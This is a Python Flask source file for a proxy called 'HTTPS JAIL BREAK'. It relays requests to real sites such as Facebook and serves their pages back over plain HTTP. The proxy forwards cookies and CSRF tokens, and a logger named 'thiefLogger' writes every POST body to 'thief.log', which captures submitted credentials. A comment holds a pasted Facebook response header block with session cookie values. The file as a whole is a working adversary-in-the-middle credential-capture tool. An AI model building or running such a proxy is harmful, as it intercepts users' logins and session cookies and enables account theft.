from flask import Flask,Response, make_response,jsonify
from flask import request
import requests
import os 
import logging
from proxy.proxy_parser import parse
app = Flask(__name__)
app.config['DEFAULT_CHARSET'] = 'utf-8'
app.config['WERKZEUG_ENCODING'] = 'utf-8'
import json 
logger = logging.Logger("thiefLogger")
logger.addHandler(logging.FileHandler("thief.log"))
logger.setLevel(logging.WARN)



PORT = 80 





@app.route("/",methods = ["GET"])
def wellcome(): 
    if request.host.removeprefix("http://").startswith("vvvvvv"): 
        return get_proxy("/")
    return """
<body  style="background-color:blue;">
<h1   style="color:lightgreen;font-size:75px;text-align: center;" >
        ⛓️⛓️⛓️ HTTPS JAIL BREAK ⛓️⛓️⛓️
    </br>
    </br>
 
    <span style="color:red;">
        to enter a website enter this pattern : <sapn style="font-size:60px;" >http://10.100.102.134:8080/&#60;host&#62;@&#60;path&#62;</span>
        </br> for example : <span style="font-size:60px;" >http://10.100.102.134:8080/https://github.com@/idanmaman2</span>
    </span>  
</h1>
</body>
"""
def copyHeaders(target , source ): 
        ALLOWED_HEADERS = {"cookie","user-Agent","referer","x-csrf-token","content-type"}
        for key , value  in source.items() : 
            if key.lower() in ALLOWED_HEADERS : 
                target[key]=value


@app.route("/<path:path>",methods = ["POST"])
def post_proxy(path):
    print(request.headers)
    if request.host.removeprefix("http://").startswith("vvvvvv."):
        print(request.json())
        logger.warning("POST : " + str(request.json))
        sub_path = path
        domain =request.host.strip().removeprefix("http://").removeprefix("vvvvvv.")
        portSpecify = domain.find(":") 
        if portSpecify != -1 : 
            domain = domain[:portSpecify]
        domain = f"https://www.{domain}/"
        print(domain+sub_path.removeprefix("/"))
        sendingHeaders = { }
        copyHeaders(sendingHeaders , request.headers)
        respone = requests.post(domain+sub_path,headers=sendingHeaders,data=request.form.to_dict())
        returningHeaders = { }
        copyHeaders(returningHeaders , respone.headers)
        parsedPage = parse(respone.text,domain,sub_path)
        return Response(parsedPage,headers=returningHeaders)




@app.route("/<path:path>",methods = ["GET"])
def get_proxy(path):
    print(request.headers)
    if request.host.removeprefix("http://").startswith("vvvvvv."):
        sub_path = path
        domain =request.host.strip().removeprefix("http://").removeprefix("vvvvvv.")
        portSpecify = domain.find(":") 
        if portSpecify != -1 : 
            domain = domain[:portSpecify]
        domain = f"https://www.{domain}/"
        logger.warning("GET: "+domain+sub_path)
        print(domain+sub_path.removeprefix("/"))
        sendingHeaders = { }
        copyHeaders(sendingHeaders , request.headers)
        respone = requests.get(domain+sub_path,headers=sendingHeaders)
        
        if  "content-type" in respone.headers and "image" in respone.headers ["content-type"]: 
         os.makedirs(f"{os.getcwd()}/{domain.replace('/','_')}/images/)", exist_ok=True) 
         with open(f"{os.getcwd()}/{domain.replace('/','_')}/images/{path.replace('/','_') if path else 'empty'}" , 'wb') as file : 
             file.write(respone.content)
         resp =   make_response(respone.content)
         resp.headers.set('Content-Type',respone.headers ["content-type"] )
         resp.headers.set('Content-Disposition', 'attachment', filename=sub_path)
         return resp 
     
     
     
        """
        {'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Set-Cookie': 'fr=05gteZEMCypcwQVkf..Bjtxj8.mK.AAA.0.0.Bjtxj8.AWVSNIaU_Wo; expires=Wed, 05-Apr-2023 18:37:47 GMT; Max-Age=7775999; path=/; domain=.facebook.com; secure; httponly, sb=_Bi3Y2GMCjUvhL1WcsLgYD51; expires=Sat, 04-Jan-2025 18:37:48 GMT; Max-Age=63072000; path=/; domain=.facebook.com; secure; httponly', 'report-to': '{"max_age":259200,"endpoints":[{"url":"https:\\/\\/www.facebook.com\\/ajax\\/browser_error_reports\\/?device_level=unknown"}]}', 'x-fb-rlafr': '0', 'document-policy': 'force-load-at-top', 'cross-origin-opener-policy': 'same-origin-allow-popups', 'Pragma': 'no-cache', 'Cache-Control': 'private, no-cache, no-store, must-revalidate', 'Expires': 'Sat, 01 Jan 2000 00:00:00 GMT', 'X-Content-Type-Options': 'nosniff', 'X-XSS-Protection': '0', 'X-Frame-Options': 'DENY', 'Strict-Transport-Security': 'max-age=15552000; preload', 'X-FB-Debug': 'Mfc6XOBjuQL6y7g2PpoaQFiJpK4XAw3aRW/8rmBJL30IesqIvfqlhJOtn3Ow9OZ3c8W2CGgcRW+Hmuh2j31Yvg==', 'Date': 'Thu, 05 Jan 2023 18:37:48 GMT', 'Alt-Svc': 'h3=":443"; ma=86400', 'Transfer-Encoding': 'chunked'}

        
        """
        returningHeaders = { }
        copyHeaders(returningHeaders , respone.headers)
        parsedPage = parse(respone.text,domain,sub_path)
        return Response(parsedPage,headers=returningHeaders)



  

if __name__ == "__main__":
    
    app.run(host="0.0.0.0",port=PORT)